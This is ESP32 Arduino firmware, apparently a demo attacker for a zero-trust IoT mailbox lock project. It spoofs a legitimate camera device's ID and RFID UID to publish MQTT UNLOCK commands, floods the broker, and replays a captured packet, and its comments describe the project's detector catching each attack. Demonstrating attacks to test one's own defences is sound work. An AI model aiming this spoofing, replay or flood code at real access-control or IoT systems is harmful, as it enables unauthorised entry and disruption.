/*
 * ============================================================
 *  Zero-Trust Rogue Skimmer — Standard ESP32 Attack Firmware
 *  Phase 4: The Hacker Tool
 * ============================================================
 *
 *  Hardware: Standard ESP32 (WROOM or WROVER) + push-button
 *  Button wired: GPIO 0 → GND (active low, with internal pull-up)
 *
 *  What this demonstrates:
 *    Press the button → sends a perfectly valid-looking JSON payload
 *    to the Pi's MQTT broker, claiming to be "ESP32_CAM_PERIMETER"
 *    with a legitimate RFID UID and UNLOCK command.
 *
 *  Why the AI catches it every time:
 *    This ESP32 is NOT running the RC522, OV2640 camera, or complex
 *    SPI bus logic. Its CPU scheduling produces:
 *      • Inter-Packet Delays (IPD) of ~200ms (vs. real ESP32-CAM: 500ms)
 *      • Zero SPI-bus jitter signatures
 *      • Free heap that's too large (no camera FB allocated: ~320KB)
 *      • No valid HMAC-SHA256 signature (wrong key)
 *
 *    The Pi's ML model was trained on REAL ESP32-CAM timing fingerprints.
 *    The attacker's "too clean" packets are immediately classified as
 *    SPOOFED and trust score drops -40 per packet.
 *
 *  PRESS COUNT MODES (cycle with each button press):
 *    Mode 1 — Single spoof packet (basic attack)
 *    Mode 2 — Flood attack (rapid-fire packets, overwhelm broker)
 *    Mode 3 — REPLAY attack (re-sends captured legitimate UID)
 *
 *  This device is clearly labelled "ATTACKER" in the MQTT client ID
 *  so the dashboard shows it as the red threat immediately.
 * ============================================================
 */

#include <Arduino.h>
#include <WiFi.h>
#include <PubSubClient.h>
#include <ArduinoJson.h>

// ── Credentials (must match the target network) ────────────────────────────
#define WIFI_SSID        "YOUR_WIFI_SSID"
#define WIFI_PASSWORD    "YOUR_WIFI_PASSWORD"
#define MQTT_BROKER      "192.168.1.109"
#define MQTT_PORT        1883
#define MQTT_CLIENT_ID   "ESP32_ROGUE_SKIMMER"
#define ATTACKER_ID      "ESP32_ROGUE_SKIMMER"

// ── Spoofed identity (the victim device's ID) ─────────────────────────────
#define SPOOFED_DEVICE_ID  "ESP32_CAM_PERIMETER"
#define SPOOFED_RFID_UID   "A3F7C2B1"     // Pre-captured legitimate UID
#define INVALID_HMAC_SIG   "deadbeef00001111deadbeef00002222"

// ── Topics ─────────────────────────────────────────────────────────────────
#define TOPIC_HEARTBEAT  "mailbox/heartbeat"
#define TOPIC_ACCESS     "mailbox/access"
#define TOPIC_STATUS     "mailbox/status"

// ── Hardware ───────────────────────────────────────────────────────────────
#define BUTTON_PIN       0      // BOOT button (GPIO 0) — already on most devkits
#define LED_PIN          2      // Built-in LED

WiFiClient   wifiClient;
PubSubClient mqtt(wifiClient);

int          attackMode      = 1;
bool         buttonWasHigh   = true;
uint32_t     spoofPacketCount = 0;
uint32_t     lastHbTime      = 0;
uint32_t     lastPacketTime  = 0;


// ═══════════════════════════════════════════════════════════════════════════
// Attack Mode 1: Single Spoof Packet
// ═══════════════════════════════════════════════════════════════════════════

void sendSpoofPacket() {
    uint32_t now = millis();
    uint32_t ipd = (lastPacketTime > 0) ? (now - lastPacketTime) : 200;
    lastPacketTime = now;
    spoofPacketCount++;

    // This is a "perfect" packet — correct format, real RFID UID...
    // ...but the timing signature betrays it.
    StaticJsonDocument<256> doc;
    doc["device_id"]           = SPOOFED_DEVICE_ID;  // ← SPOOFED
    doc["rfid_uid"]            = SPOOFED_RFID_UID;
    doc["challenge_response"]  = "RED";              // Guessing the color
    doc["photo_crc"]           = "00000000";         // No real camera
    doc["photo_size_bytes"]    = 0;
    doc["timestamp"]           = (unsigned long)esp_timer_get_time() / 1000;
    doc["inter_packet_delay"]  = ipd;               // ← Too fast: ~200ms
    doc["rssi"]                = WiFi.RSSI();
    doc["free_heap"]           = esp_get_free_heap_size();  // ← Too large: ~320KB
    doc["packet_size"]         = 256;
    doc["sig"]                 = INVALID_HMAC_SIG;  // ← Wrong HMAC key
    doc["action"]              = "UNLOCK";          // ← The attack command

    String payload;
    serializeJson(doc, payload);

    bool sent = mqtt.publish(TOPIC_ACCESS, payload.c_str());
    Serial.printf("[ATTACK] Mode1 packet #%u sent=%d IPD=%ums\n",
                  spoofPacketCount, sent, ipd);

    // Blink LED to show attack sent
    digitalWrite(LED_PIN, HIGH); delay(100); digitalWrite(LED_PIN, LOW);
}


// ═══════════════════════════════════════════════════════════════════════════
// Attack Mode 2: Heartbeat Flood (DDoS on MQTT broker)
// ═══════════════════════════════════════════════════════════════════════════

void floodAttack() {
    Serial.println("[ATTACK] Mode2: FLOOD ATTACK — 50 rapid packets");
    for (int i = 0; i < 50; i++) {
        // Send extremely fast packets — IPD ≈ 20ms — guaranteed to trip the AI
        StaticJsonDocument<256> doc;
        doc["device_id"]          = SPOOFED_DEVICE_ID;
        doc["inter_packet_delay"] = 20;           // ← 20ms: impossibly fast
        doc["rssi"]               = WiFi.RSSI();
        doc["free_heap"]          = 320000;       // ← Unrealistically large
        doc["packet_size"]        = 256;
        doc["timestamp"]          = esp_timer_get_time() / 1000;
        doc["sig"]                = INVALID_HMAC_SIG;

        String p; serializeJson(doc, p);
        mqtt.publish(TOPIC_HEARTBEAT, p.c_str());
        mqtt.loop();
        delay(20);   // 50Hz = 20ms IPD

        digitalWrite(LED_PIN, i % 2);
    }
    Serial.println("[ATTACK] Flood complete.");
    digitalWrite(LED_PIN, LOW);
}


// ═══════════════════════════════════════════════════════════════════════════
// Attack Mode 3: Replay Attack
// ═══════════════════════════════════════════════════════════════════════════

void replayAttack() {
    Serial.println("[ATTACK] Mode3: REPLAY captured legitimate packet");

    // This simulates a captured and re-transmitted VALID packet.
    // The AI still catches it because the TIMESTAMP and IPD don't match
    // the expected cadence for the real device (the timing is in the past).
    StaticJsonDocument<512> doc;
    doc["device_id"]           = SPOOFED_DEVICE_ID;
    doc["rfid_uid"]            = SPOOFED_RFID_UID;
    doc["challenge_response"]  = "BLUE";
    doc["photo_crc"]           = "4A3F91BC";     // captured real CRC
    doc["photo_size_bytes"]    = 38912;           // captured real size
    doc["timestamp"]           = 1714000000;      // ← OLD timestamp!
    doc["inter_packet_delay"]  = 500;             // correct cadence...
    doc["rssi"]                = -55;
    doc["free_heap"]           = 180000;
    doc["packet_size"]         = 256;
    doc["sig"]                 = "c9f3a8b200deadbeef00112233445566"; // stale
    doc["action"]              = "UNLOCK";

    String payload;
    serializeJson(doc, payload);
    mqtt.publish(TOPIC_ACCESS, payload.c_str());

    Serial.println("[ATTACK] Replay packet sent — timestamp is stale.");
    for (int i = 0; i < 5; i++) {
        digitalWrite(LED_PIN, HIGH); delay(200);
        digitalWrite(LED_PIN, LOW);  delay(200);
    }
}


// ═══════════════════════════════════════════════════════════════════════════
// MQTT Setup
// ═══════════════════════════════════════════════════════════════════════════

void reconnectMQTT() {
    while (!mqtt.connected()) {
        Serial.print("[MQTT] Skimmer connecting...");
        if (mqtt.connect(MQTT_CLIENT_ID)) {
            Serial.println(" OK");
            // Announce ourselves (so the dashboard shows us as a threat)
            StaticJsonDocument<128> ann;
            ann["device_id"]  = ATTACKER_ID;
            ann["status"]     = "ONLINE";
            ann["role"]       = "ROGUE_SKIMMER";
            String annStr; serializeJson(ann, annStr);
            mqtt.publish(TOPIC_STATUS, annStr.c_str());
        } else {
            Serial.printf(" FAIL rc=%d\n", mqtt.state());
            delay(3000);
        }
    }
}


// ═══════════════════════════════════════════════════════════════════════════
// Setup & Loop
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    Serial.begin(115200);
    Serial.println("\n[BOOT] Zero-Trust Rogue Skimmer v1.0");
    Serial.println("        ██████╗  ██████╗ ██╗ ██╗██╗███████╗");
    Serial.println("        ██╔══██╗██╔═══██╗██║ ██║██║██╔════╝");
    Serial.println("        ██████╔╝██║   ██║██║ ██║██║█████╗  ");
    Serial.println("        ██╔══██╗██║   ██║██║ ██║██║██╔══╝  ");
    Serial.println("        ██║  ██║╚██████╔╝╚██████╔╝██║███████╗");
    Serial.println("        ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝╚══════╝");

    pinMode(BUTTON_PIN, INPUT_PULLUP);
    pinMode(LED_PIN, OUTPUT);

    WiFi.mode(WIFI_STA);
    WiFi.begin(WIFI_SSID, WIFI_PASSWORD);
    Serial.print("[WIFI] Connecting");
    while (WiFi.status() != WL_CONNECTED) {
        delay(500); Serial.print(".");
    }
    Serial.printf("\n[WIFI] Connected: %s\n", WiFi.localIP().toString().c_str());

    mqtt.setServer(MQTT_BROKER, MQTT_PORT);
    mqtt.setBufferSize(4096);
    reconnectMQTT();

    Serial.println("\n[READY] Press BOOT button to launch attack.");
    Serial.println("  Single press → cycle attack mode (1→2→3→1)");
    Serial.println("  Hold 2s      → launch current mode");
    Serial.println("  Current mode: 1 (Single Spoof Packet)");
}

void loop() {
    if (!mqtt.connected()) reconnectMQTT();
    mqtt.loop();

    bool buttonNow = digitalRead(BUTTON_PIN);   // LOW = pressed

    // ── Button logic: short press = cycle mode, hold = launch ─────────────
    static unsigned long pressStart = 0;

    if (buttonNow == LOW && buttonWasHigh) {
        pressStart = millis();
    }

    if (buttonNow == HIGH && !buttonWasHigh) {
        unsigned long held = millis() - pressStart;
        if (held < 500) {
            // Short press → cycle mode
            attackMode = (attackMode % 3) + 1;
            Serial.printf("[MODE] Attack mode: %d\n", attackMode);
            for (int i = 0; i < attackMode; i++) {
                digitalWrite(LED_PIN, HIGH); delay(150);
                digitalWrite(LED_PIN, LOW);  delay(150);
            }
        } else {
            // Long press → launch
            Serial.printf("[LAUNCH] Launching Mode %d attack!\n", attackMode);
            switch (attackMode) {
                case 1: sendSpoofPacket(); break;
                case 2: floodAttack();     break;
                case 3: replayAttack();    break;
            }
        }
    }

    buttonWasHigh = buttonNow;
    delay(10);
}
